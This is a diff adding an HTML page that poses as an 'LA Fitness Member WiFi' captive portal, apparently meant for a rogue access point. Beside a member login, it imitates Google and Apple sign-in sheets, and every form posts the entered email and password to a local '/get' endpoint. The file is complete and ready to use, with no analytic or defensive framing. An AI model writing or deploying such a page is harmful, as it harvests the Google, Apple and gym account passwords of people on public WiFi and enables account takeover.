@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>LA Fitness WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;min-height:100vh;background:linear-gradient(180deg,#001a5e 0%,#001040 40%,#000820 100%);display:flex;flex-direction:column}
+#t-home,#t-info,#t-plans,#t-help,#tog-g,#tog-a{display:none}
+nav{padding:0;display:flex;justify-content:center;background:rgba(0,0,0,0.25);flex-shrink:0;border-bottom:1px solid rgba(255,255,255,0.08)}
+nav label{color:rgba(255,255,255,0.55);font-size:14px;font-weight:500;cursor:pointer;padding:12px 18px;border-bottom:2px solid transparent;margin-bottom:-1px}
+#t-home:checked  ~ nav label[for=t-home],
+#t-info:checked  ~ nav label[for=t-info],
+#t-plans:checked ~ nav label[for=t-plans],
+#t-help:checked  ~ nav label[for=t-help]{color:#E31837;border-bottom-color:#E31837}
+.scene{flex:1;display:flex;flex-direction:column;align-items:center;padding:28px 18px 28px}
+.panel{display:none;width:100%;max-width:420px}
+#t-home:checked  ~ .scene .p-home{display:block}
+#t-info:checked  ~ .scene .p-info{display:block}
+#t-plans:checked ~ .scene .p-plans{display:block}
+#t-help:checked  ~ .scene .p-help{display:block}
+.card{background:rgba(0,8,35,0.9);border-radius:16px;padding:24px 20px 20px;box-shadow:0 8px 40px rgba(0,0,0,0.3);margin-bottom:12px}
+.card h1{font-size:20px;font-weight:700;color:#fff;text-align:center;margin-bottom:16px}
+.card h2{font-size:16px;font-weight:700;color:#fff;margin-bottom:9px}
+.card p{font-size:13.5px;color:rgba(255,255,255,0.72);line-height:1.65;margin-bottom:10px}
+.card ul{font-size:13.5px;color:rgba(255,255,255,0.72);line-height:1.85;padding-left:18px}
+input[type=text],input[type=password]{width:100%;padding:13px 15px;margin-bottom:10px;border:none;border-radius:10px;font-size:15px;background:rgba(255,255,255,0.95);color:#1a1a1a;font-family:inherit;outline:none;display:block}
+input::placeholder{color:#bbb}
+.btn-main{width:100%;padding:13px;border:none;border-radius:10px;background:#003DA5;color:#fff;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:10px;font-family:inherit;display:block;text-align:center}
+.divider{display:flex;align-items:center;gap:10px;margin:2px 0 10px}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:rgba(255,255,255,0.18)}
+.divider span{font-size:12px;color:rgba(255,255,255,0.45);white-space:nowrap}
+.btn-google{width:100%;padding:12px;border:none;border-radius:10px;background:#fff;color:#1a1a1a;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:8px;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:9px}
+.btn-apple{width:100%;padding:12px;border:none;border-radius:10px;background:#1a1a1a;color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:9px}
+.g-dots{display:flex;gap:3px}
+.gd{width:8px;height:8px;border-radius:50%}
+.plan{background:rgba(255,255,255,0.07);border-radius:12px;padding:15px;margin-bottom:10px;border:1.5px solid transparent}
+.plan.featured{border-color:#E31837}
+.plan-badge{display:inline-block;background:#003DA5;color:#fff;font-size:10px;font-weight:700;padding:3px 10px;border-radius:20px;margin-bottom:8px;letter-spacing:0.5px}
+.plan-name{font-size:14px;font-weight:700;color:#fff;margin-bottom:3px}
+.plan-price{font-size:24px;font-weight:800;color:#fff;margin-bottom:5px}
+.plan-price span{font-size:13px;font-weight:400;color:rgba(255,255,255,0.55)}
+.plan-desc{font-size:13px;color:rgba(255,255,255,0.65);line-height:1.55}
+.help-item{background:rgba(255,255,255,0.07);border-radius:12px;padding:14px 16px;margin-bottom:10px}
+.help-q{font-size:14px;font-weight:700;color:#fff;margin-bottom:5px}
+.help-a{font-size:13px;color:rgba(255,255,255,0.65);line-height:1.6}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:100;align-items:flex-end;justify-content:center}
+#tog-g:checked ~ .ov-g,#tog-a:checked ~ .ov-a{display:flex}
+.bd{position:absolute;inset:0;cursor:default}
+.sheet-g{position:relative;background:#fff;border-radius:20px 20px 0 0;width:100%;max-width:480px;padding:20px 22px 38px;z-index:1}
+.handle{width:36px;height:4px;background:#e0e0e0;border-radius:2px;margin:0 auto 18px}
+.gl{display:flex;gap:4px;justify-content:center;margin-bottom:12px}
+.g-title{font-size:20px;font-weight:600;color:#202124;text-align:center;margin-bottom:3px}
+.g-sub{font-size:13px;color:#5f6368;text-align:center;margin-bottom:18px}
+.g-lbl{font-size:12px;color:#5f6368;margin-bottom:5px;display:block}
+.g-inp{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;color:#202124;font-family:inherit;outline:none;margin-bottom:12px;display:block}
+.g-inp::placeholder{color:#bbb}
+.g-row{display:flex;justify-content:space-between;align-items:center;margin-top:4px}
+.g-cancel{font-size:14px;color:#1a73e8;cursor:pointer;background:none;border:none;font-family:inherit}
+.g-next{background:#1a73e8;color:#fff;border:none;border-radius:10px;padding:11px 24px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit}
+.sheet-a{position:relative;background:#f2f2f7;border-radius:20px 20px 0 0;width:100%;max-width:480px;padding:20px 22px 38px;z-index:1}
+.apple-ic{font-size:34px;color:#1a1a1a;text-align:center;margin-bottom:5px}
+.a-title{font-size:17px;font-weight:600;color:#1a1a1a;text-align:center;margin-bottom:4px}
+.a-sub{font-size:13px;color:#666;text-align:center;margin-bottom:18px;line-height:1.5}
+.a-fields{background:#fff;border-radius:12px;overflow:hidden;margin-bottom:12px}
+.a-inp{width:100%;padding:14px 15px;border:none;font-size:16px;color:#1a1a1a;font-family:inherit;outline:none;background:#fff;display:block}
+.a-inp::placeholder{color:#bbb}
+.a-inp:first-child{border-bottom:1px solid #e8e8e8}
+.a-continue{width:100%;padding:14px;border:none;border-radius:12px;background:#1a1a1a;color:#fff;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:9px;display:block}
+.a-cancel{display:block;width:100%;padding:13px;border-radius:12px;background:#fff;color:#1a1a1a;font-size:16px;text-align:center;cursor:pointer}
+</style>
+</head>
+<body>
+<input type="radio" name="tab" id="t-home" checked>
+<input type="radio" name="tab" id="t-info">
+<input type="radio" name="tab" id="t-plans">
+<input type="radio" name="tab" id="t-help">
+<input type="checkbox" id="tog-g">
+<input type="checkbox" id="tog-a">
+<nav>
+  <label for="t-home">Home</label>
+  <label for="t-info">Info</label>
+  <label for="t-plans">Plans</label>
+  <label for="t-help">Help</label>
+</nav>
+<div class="scene">
+  <div class="panel p-home"><div class="card">
+    <h1>LA Fitness Member WiFi</h1>
+    <form action="/get">
+      <input type="text" name="email" placeholder="Member email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit" class="btn-main">Connect</button>
+    </form>
+    <div class="divider"><span>or continue with</span></div>
+    <label for="tog-g" class="btn-google"><div class="g-dots"><div class="gd" style="background:#4285F4"></div><div class="gd" style="background:#EA4335"></div><div class="gd" style="background:#FBBC05"></div><div class="gd" style="background:#34A853"></div></div>Continue with Google</label>
+    <label for="tog-a" class="btn-apple" style="margin-top:8px">&#63743; Continue with Apple</label>
+  </div></div>
+  <div class="panel p-info"><div class="card">
+    <h2>About LA Fitness WiFi</h2>
+    <p>LA Fitness provides complimentary WiFi at all club locations. Stay connected while you work out, stream your music, and track your fitness journey.</p>
+    <p>Premium members enjoy priority bandwidth at all LA Fitness and City Sports Club locations. Sign in with your member account to activate your benefits.</p>
+    <h2 style="margin-top:4px">Coverage</h2>
+    <ul><li>All LA Fitness club locations nationwide</li><li>Premium members get priority bandwidth</li><li>Fitness app and streaming support</li><li>Pool, courts, and locker room coverage</li></ul>
+  </div></div>
+  <div class="panel p-plans"><div class="card">
+    <h2 style="text-align:center;margin-bottom:14px">WiFi Plans</h2>
+    <div class="plan"><div class="plan-name">Member WiFi</div><div class="plan-price">Free</div><div class="plan-desc">Standard WiFi included with all LA Fitness memberships.</div></div>
+    <div class="plan featured"><div class="plan-badge">MOST POPULAR</div><div class="plan-name">Premium Member</div><div class="plan-price">Free — Priority</div><div class="plan-desc">Priority bandwidth for Premium membership holders.</div></div>
+    <div class="plan"><div class="plan-name">Multi-Club+</div><div class="plan-price">$34.99/mo</div><div class="plan-desc">Access to all LA Fitness and City Sports Club locations with priority WiFi.</div></div>
+  </div></div>
+  <div class="panel p-help"><div class="card">
+    <h2 style="margin-bottom:12px">Help &amp; Support</h2>
+    <div class="help-item"><div class="help-q">Can't connect?</div><div class="help-a">Make sure you're connected to <strong>LAFitness_WiFi</strong> in your WiFi settings, then sign out and back in to refresh your session.</div></div>
+    <div class="help-item"><div class="help-q">How long does my session last?</div><div class="help-a">Sessions are unlimited during club hours.</div></div>
+    <div class="help-item"><div class="help-q">Is my connection secure?</div><div class="help-a">Your session is encrypted. As with any public network, avoid sensitive transactions like online banking while connected.</div></div>
+    <div class="help-item"><div class="help-q">Need more help?</div><div class="help-a">Ask a team member or visit <strong>lafitness.com/page/contactus</strong> for assistance.</div></div>
+  </div></div>
+</div>
+<div class="overlay ov-g">
+  <label for="tog-g" class="bd"></label>
+  <div class="sheet-g">
+    <div class="handle"></div>
+    <div class="gl"><div class="gd" style="background:#4285F4;width:10px;height:10px"></div><div class="gd" style="background:#EA4335;width:10px;height:10px"></div><div class="gd" style="background:#FBBC05;width:10px;height:10px"></div><div class="gd" style="background:#34A853;width:10px;height:10px"></div></div>
+    <div class="g-title">Sign in with Google</div>
+    <div class="g-sub">Continue to your Google Account</div>
+    <form action="/get">
+      <label class="g-lbl">Email or phone</label>
+      <input class="g-inp" type="text" name="email" placeholder="Enter your email" required>
+      <label class="g-lbl">Password</label>
+      <input class="g-inp" type="password" name="password" placeholder="Enter your password" required>
+      <div class="g-row"><label for="tog-g" class="g-cancel">Cancel</label><button type="submit" class="g-next">Next</button></div>
+    </form>
+  </div>
+</div>
+<div class="overlay ov-a">
+  <label for="tog-a" class="bd"></label>
+  <div class="sheet-a">
+    <div class="handle"></div>
+    <div class="apple-ic">&#63743;</div>
+    <div class="a-title">Sign in with Apple</div>
+    <div class="a-sub">Sign in with your Apple&#8209;ID to continue to LA Fitness</div>
+    <form action="/get">
+      <div class="a-fields">
+        <input class="a-inp" type="text" name="email" placeholder="Apple ID" required>
+        <input class="a-inp" type="password" name="password" placeholder="Password" required>
+      </div>
+      <button type="submit" class="a-continue">Continue</button>
+      <label for="tog-a" class="a-cancel">Cancel</label>
+    </form>
+  </div>
+</div>
+</body>
+</html>
